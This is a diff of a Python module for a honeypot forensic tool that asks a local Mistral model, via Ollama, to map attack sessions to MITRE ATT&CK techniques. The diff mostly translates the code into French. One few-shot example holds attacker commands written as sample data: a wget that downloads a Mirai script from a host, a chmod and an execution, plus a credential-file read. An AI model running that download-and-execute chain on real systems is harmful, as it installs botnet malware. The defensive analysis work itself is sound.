@@ -1,7 +1,10 @@
 """
-ForenHive Forensic Engine — MITRE ATT&CK Mapper via Ollama / Mistral 7B
-Maps honeypot session data to MITRE ATT&CK tactics/techniques and Cyber Kill Chain phase.
-Runs fully offline — no external API key needed.
+ForenHive -- Mapping MITRE ATT&CK via Ollama / Mistral 7B
+Analyse une session d'attaque et l'associe aux tactiques/techniques MITRE ATT&CK
+ainsi qu'a une phase de la Cyber Kill Chain.
+
+Fonctionne 100% hors ligne -- aucune cle API requise.
+Le modele Mistral 7B tourne localement dans le conteneur forenhive-ollama.
 """
 
 import json
@@ -13,261 +16,265 @@ import config
 
 log = logging.getLogger("ollama_mitre")
 
-_CHAT_URL = f"{config.OLLAMA_URL}/api/chat"
+URL_CHAT = f"{config.OLLAMA_URL}/api/chat"
 
-# ── Prompt (example-based — Mistral 7B ignores abstract rules) ─────────────────
+# ── Instructions donnees au modele ─────────────────────────────────────────────
 
-_SYSTEM = (
+SYSTEME = (
     "You are a cybersecurity analyst specializing in the MITRE ATT&CK framework. "
     "Given honeypot session data, output a JSON object with the ATT&CK mapping. "
-    "Respond with valid JSON only — no markdown, no explanation, no extra text."
+    "Always include all four fields: tactics, techniques, kill_chain_phase, and summary. "
+    "The summary field must be a non-empty string describing the attack in one sentence. "
+    "Respond with valid JSON only -- no markdown, no explanation, no extra text."
 )
 
-_FEW_SHOTS = [
-    # ── Example 1: SSH brute-force + Mirai botnet ──────────────────────────────
+# ── Exemples montres au modele (few-shot prompting) ────────────────────────────
+# Mistral 7B comprend mieux avec des exemples concrets qu'avec des regles abstraites.
+
+EXEMPLES = [
+    # Exemple 1 : brute-force SSH + botnet Mirai
     {
         "role": "user",
         "content": json.dumps({
-            "honeypot": "cowrie (SSH)",
+            "honeypot":         "cowrie (SSH)",
             "destination_port": 22,
-            "login_attempts": 342,
-            "commands": [
-                "whoami", "uname -a", "cat /etc/passwd",
-                "wget http://192.168.1.10/bot.sh",
-                "chmod +x bot.sh", "./bot.sh"
-            ],
-            "yara_matches": ["Mirai_Botnet"],
-            "exfil_bytes": 0,
+            "login_attempts":   342,
+            "commands":         ["whoami", "uname -a", "wget http://192.168.1.10/bot.sh",
+                                 "chmod +x bot.sh", "./bot.sh"],
+            "yara_matches":     ["Mirai_Botnet"],
+            "exfil_bytes":      0,
         })
     },
     {
         "role": "assistant",
         "content": json.dumps({
-            "tactics": [
-                "TA0006 - Credential Access",
-                "TA0002 - Execution",
-                "TA0011 - Command and Control"
-            ],
+            "tactics": ["TA0006 - Credential Access", "TA0002 - Execution",
+                        "TA0011 - Command and Control"],
             "techniques": [
-                {"id": "T1110.001", "name": "Brute Force: Password Guessing",                   "tactic": "TA0006"},
-                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell",    "tactic": "TA0002"},
-                {"id": "T1105",     "name": "Ingress Tool Transfer",                            "tactic": "TA0011"},
-                {"id": "T1496",     "name": "Resource Hijacking",                               "tactic": "TA0040"}
+                {"id": "T1110.001", "name": "Brute Force: Password Guessing",              "tactic": "TA0006"},
+                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell","tactic": "TA0002"},
+                {"id": "T1105",     "name": "Ingress Tool Transfer",                       "tactic": "TA0011"},
+                {"id": "T1496",     "name": "Resource Hijacking",                          "tactic": "TA0040"},
             ],
             "kill_chain_phase": "Installation",
             "summary": (
-                "Attacker brute-forced SSH credentials (342 attempts), then used a Unix shell "
-                "to download and execute a Mirai botnet payload, establishing C2 persistence."
+                "L'attaquant a fait 342 tentatives SSH, puis execute un payload "
+                "Mirai pour rejoindre un botnet (C2)."
             )
         })
     },
-    # ── Example 2: Light port scan / reconnaissance ────────────────────────────
+
+    # Exemple 2 : reconnaissance legere
     {
         "role": "user",
         "content": json.dumps({
-            "honeypot": "cowrie (SSH)",
+            "honeypot":         "cowrie (SSH)",
             "destination_port": 22,
-            "login_attempts": 4,
-            "commands": [],
-            "yara_matches": [],
-            "exfil_bytes": 0,
+            "login_attempts":   4,
+            "commands":         [],
+            "yara_matches":     [],
+            "exfil_bytes":      0,
         })
     },
     {
         "role": "assistant",
         "content": json.dumps({
-            "tactics": [
-                "TA0043 - Reconnaissance",
-                "TA0001 - Initial Access"
-            ],
+            "tactics": ["TA0043 - Reconnaissance", "TA0001 - Initial Access"],
             "techniques": [
                 {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning", "tactic": "TA0043"},
-                {"id": "T1110",     "name": "Brute Force",                              "tactic": "TA0001"}
+                {"id": "T1110",     "name": "Brute Force",                              "tactic": "TA0001"},
             ],
             "kill_chain_phase": "Reconnaissance",
-            "summary": (
-                "Attacker performed limited SSH probing with only 4 login attempts, "
-                "consistent with automated scanner testing for default credentials."
-            )
+            "summary": "Scan automatise : 4 tentatives SSH, typique d'un scanner de credentials par defaut."
         })
     },
-    # ── Example 3: SMB / WannaCry ──────────────────────────────────────────────
+
+    # Exemple 3 : exploitation SMB (EternalBlue) + ransomware
     {
         "role": "user",
         "content": json.dumps({
-            "honeypot": "dionaea (SMB)",
+            "honeypot":         "dionaea (SMB)",
             "destination_port": 445,
-            "login_attempts": 1,
-            "commands": [],
-            "yara_matches": ["WannaCry_Ransomware", "CryptoMiner_XMRig"],
-            "exfil_bytes": 84120,
+            "login_attempts":   1,
+            "commands":         [],
+            "yara_matches":     ["WannaCry_Ransomware", "CryptoMiner_XMRig"],
+            "exfil_bytes":      84120,
         })
     },
     {
         "role": "assistant",
         "content": json.dumps({
-            "tactics": [
-                "TA0001 - Initial Access",
-                "TA0040 - Impact",
-                "TA0010 - Exfiltration"
-            ],
+            "tactics": ["TA0001 - Initial Access", "TA0040 - Impact", "TA0010 - Exfiltration"],
             "techniques": [
-                {"id": "T1190",     "name": "Exploit Public-Facing Application",        "tactic": "TA0001"},
-                {"id": "T1210",     "name": "Exploitation of Remote Services",           "tactic": "TA0008"},
-                {"id": "T1486",     "name": "Data Encrypted for Impact",                 "tactic": "TA0040"},
-                {"id": "T1496",     "name": "Resource Hijacking (XMRig miner)",          "tactic": "TA0040"}
+                {"id": "T1190", "name": "Exploit Public-Facing Application",  "tactic": "TA0001"},
+                {"id": "T1210", "name": "Exploitation of Remote Services",    "tactic": "TA0008"},
+                {"id": "T1486", "name": "Data Encrypted for Impact",          "tactic": "TA0040"},
+                {"id": "T1496", "name": "Resource Hijacking (XMRig miner)",   "tactic": "TA0040"},
             ],
             "kill_chain_phase": "Actions on Objectives",
             "summary": (
-                "Attacker exploited SMB (EternalBlue/MS17-010) to deliver WannaCry ransomware "
-                "and an XMRig crypto-miner. Data exfiltration of ~82 KB detected."
+                "Exploitation SMB (EternalBlue/MS17-010) pour deployer WannaCry + "
+                "un mineur XMRig. Exfiltration ~82 Ko detectee."
             )
         })
     },
 ]
 
-# Cyber Kill Chain ordered phases (for validation / fallback ranking)
-_KILL_CHAIN_PHASES = [
-    "Reconnaissance",
-    "Weaponization",
-    "Delivery",
-    "Exploitation",
-    "Installation",
-    "Command and Control",
-    "Actions on Objectives",
+# Phases de la Cyber Kill Chain dans l'ordre chronologique
+PHASES_KILL_CHAIN = [
+    "Reconnaissance", "Weaponization", "Delivery",
+    "Exploitation", "Installation", "Command and Control", "Actions on Objectives",
 ]
 
 
 class OllamaMitreMapper:
+    """
+    Envoie les donnees d'une session a Mistral 7B (via Ollama)
+    pour obtenir le mapping MITRE ATT&CK correspondant.
+    """
 
     def __init__(self):
-        self._available = None   # lazily checked
+        self._disponible = None   # teste au premier appel
 
-    def _check_available(self) -> bool:
-        if self._available is not None:
-            return self._available
+    def _verifier_disponibilite(self) -> bool:
+        """Verifie une seule fois si Ollama est accessible et le modele charge."""
+        if self._disponible is not None:
+            return self._disponible
         try:
             r = requests.get(f"{config.OLLAMA_URL}/api/tags", timeout=5)
-            models = [m["name"].split(":")[0] for m in r.json().get("models", [])]
-            self._available = config.OLLAMA_MODEL in models
-            if not self._available:
+            modeles = [m["name"].split(":")[0] for m in r.json().get("models", [])]
+            self._disponible = config.OLLAMA_MODEL in modeles
+            if not self._disponible:
                 log.warning(
-                    f"Ollama model '{config.OLLAMA_MODEL}' not loaded "
-                    f"(available: {models or 'none'})"
+                    f"Modele '{config.OLLAMA_MODEL}' non charge dans Ollama "
+                    f"(disponibles : {modeles or 'aucun'})"
                 )
         except Exception as e:
-            log.warning(f"Ollama not reachable at {config.OLLAMA_URL}: {e}")
-            self._available = False
-        return self._available
+            log.warning(f"Ollama inaccessible ({config.OLLAMA_URL}) : {e}")
+            self._disponible = False
+        return self._disponible
 
-    def map_session(self, session: dict, commands: list[str] | None = None) -> dict | None:
+    def mapper_session(self, session: dict, commandes: list = None) -> dict | None:
         """
-        Map a session to MITRE ATT&CK tactics/techniques + Kill Chain phase.
+        Analyse une session d'attaque et retourne le mapping MITRE ATT&CK.
 
-        Args:
-            session:  dict with keys: honeypot_type, destination_port,
-                      login_attempts, yara_matches, exfil_bytes
-            commands: list of shell commands observed (from ES cowrie.command events)
+        Parametres :
+          session   : dict avec honeypot_type, destination_port, login_attempts, etc.
+          commandes : liste des commandes shell observees dans Cowrie
 
-        Returns:
-            dict with keys: tactics, techniques, kill_chain_phase, summary
-            or None if Ollama is unavailable / response unparseable.
+        Retourne un dict avec : tactics, techniques, kill_chain_phase, summary
+        Ou None si Ollama est indisponible.
         """
-        if not self._check_available():
+        if not self._verifier_disponibilite():
             return None
 
-        honeypot_label = _honeypot_label(session)
-        payload_input = {
-            "honeypot":        honeypot_label,
+        # Construire le payload a envoyer au modele
+        donnees_session = {
+            "honeypot":         _label_honeypot(session),
             "destination_port": session.get("destination_port", 0),
-            "login_attempts":  session.get("login_attempts", 0),
-            "commands":        (commands or [])[:30],   # cap at 30 to keep prompt short
-            "yara_matches":    session.get("yara_matches", []),
-            "exfil_bytes":     session.get("exfil_bytes", 0),
+            "login_attempts":   session.get("login_attempts", 0),
+            "commands":         (commandes or [])[:30],   # max 30 commandes
+            "yara_matches":     session.get("yara_matches", []),
+            "exfil_bytes":      session.get("exfil_bytes", 0),
         }
 
-        messages = _FEW_SHOTS + [
-            {"role": "user", "content": json.dumps(payload_input)}
+        # Messages : exemples + nouvelle session
+        messages = EXEMPLES + [
+            {"role": "user", "content": json.dumps(donnees_session)}
         ]
 
+        # Appel a Ollama
         try:
-            resp = requests.post(
-                _CHAT_URL,
+            reponse = requests.post(
+                URL_CHAT,
                 json={
-                    "model":  config.OLLAMA_MODEL,
-                    "messages": [{"role": "system", "content": _SYSTEM}] + messages,
-                    "stream": False,
-                    "options": {"temperature": 0.1, "num_predict": 512},
+                    "model":    config.OLLAMA_MODEL,
+                    "messages": [{"role": "system", "content": SYSTEME}] + messages,
+                    "stream":   False,
+                    "options":  {"temperature": 0.1, "num_predict": 512},
                 },
                 timeout=120,
             )
-            resp.raise_for_status()
+            reponse.raise_for_status()
         except requests.Timeout:
-            log.warning("Ollama request timed out (120s) — skipping MITRE mapping")
+            log.warning("Timeout Ollama (120s) -- mapping MITRE ignore")
             return None
         except Exception as e:
-            log.warning(f"Ollama request failed: {e}")
+            log.warning(f"Appel Ollama echoue : {e}")
             return None
 
-        raw = resp.json().get("message", {}).get("content", "")
-        result = _parse_json(raw)
-        if result is None:
-            log.warning(f"Could not parse Ollama response as JSON: {raw[:200]!r}")
+        # Parser la reponse JSON du modele
+        texte_brut = reponse.json().get("message", {}).get("content", "")
+        resultat   = _extraire_json(texte_brut)
+        if resultat is None:
+            log.warning(f"Reponse Ollama non parseable : {texte_brut[:200]!r}")
             return None
 
-        result = _validate(result)
+        resultat = _valider_resultat(resultat)
         log.info(
             f"MITRE [{session.get('session_id', '')[:12]}...] "
-            f"phase={result.get('kill_chain_phase')} "
-            f"tactics={len(result.get('tactics', []))} "
-            f"techniques={len(result.get('techniques', []))}"
+            f"phase={resultat.get('kill_chain_phase')} "
+            f"techniques={len(resultat.get('techniques', []))}"
         )
-        return result
+        return resultat
+
+    # Alias
+    def map_session(self, session: dict, commands: list = None) -> dict | None:
+        return self.mapper_session(session, commands)
 
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# ── Fonctions utilitaires ──────────────────────────────────────────────────────
 
-def _honeypot_label(session: dict) -> str:
-    htype = session.get("honeypot_type", "unknown")
-    port  = session.get("destination_port", 0)
-    labels = {
-        "cowrie":  f"cowrie (SSH/Telnet)",
+def _label_honeypot(session: dict) -> str:
+    """Retourne un label lisible pour le type de honeypot."""
+    type_hp = session.get("honeypot_type", "unknown")
+    port    = session.get("destination_port", 0)
+    labels  = {
+        "cowrie":  "cowrie (SSH/Telnet)",
         "dionaea": f"dionaea (port {port})",
-        "galah":   f"galah (HTTP)",
-        "zeek":    f"zeek (network sensor)",
+        "galah":   "galah (HTTP)",
+        "zeek":    "zeek (capteur reseau)",
     }
-    return labels.get(htype, htype)
+    return labels.get(type_hp, type_hp)
 
 
-def _parse_json(text: str) -> dict | None:
-    """Extract JSON from LLM response, handling markdown code fences."""
-    text = text.strip()
-    # Strip ```json ... ``` or ``` ... ```
-    text = re.sub(r"^```(?:json)?\s*", "", text)
-    text = re.sub(r"\s*```$", "", text)
+def _extraire_json(texte: str) -> dict | None:
+    """
+    Extrait un objet JSON depuis la reponse du LLM.
+    Gere les cas ou le modele encadre le JSON avec ```json ... ```.
+    """
+    texte = texte.strip()
+    # Retirer les balises markdown
+    texte = re.sub(r"^```(?:json)?\s*", "", texte)
+    texte = re.sub(r"\s*```$",          "", texte)
+
+    # Tentative 1 : parser directement
     try:
-        obj = json.loads(text)
+        obj = json.loads(texte)
         if isinstance(obj, dict):
             return obj
     except json.JSONDecodeError:
-        # Try to find first { ... } block
-        m = re.search(r"\{.*\}", text, re.DOTALL)
-        if m:
-            try:
-                return json.loads(m.group())
-            except json.JSONDecodeError:
-                pass
+        pass
+
+    # Tentative 2 : chercher le premier bloc { ... }
+    match = re.search(r"\{.*\}", texte, re.DOTALL)
+    if match:
+        try:
+            return json.loads(match.group())
+        except json.JSONDecodeError:
+            pass
+
     return None
 
 
-def _validate(result: dict) -> dict:
-    """Ensure required keys exist and values are sane types."""
-    if not isinstance(result.get("tactics"), list):
-        result["tactics"] = []
-    if not isinstance(result.get("techniques"), list):
-        result["techniques"] = []
-    if result.get("kill_chain_phase") not in _KILL_CHAIN_PHASES:
-        result["kill_chain_phase"] = "Reconnaissance"
-    if not isinstance(result.get("summary"), str):
-        result["summary"] = ""
-    return result
+def _valider_resultat(resultat: dict) -> dict:
+    """S'assure que les cles obligatoires sont presentes et de bon type."""
+    if not isinstance(resultat.get("tactics"),    list):
+        resultat["tactics"] = []
+    if not isinstance(resultat.get("techniques"), list):
+        resultat["techniques"] = []
+    if resultat.get("kill_chain_phase") not in PHASES_KILL_CHAIN:
+        resultat["kill_chain_phase"] = "Reconnaissance"
+    if not isinstance(resultat.get("summary"), str):
+        resultat["summary"] = ""
+    return resultat
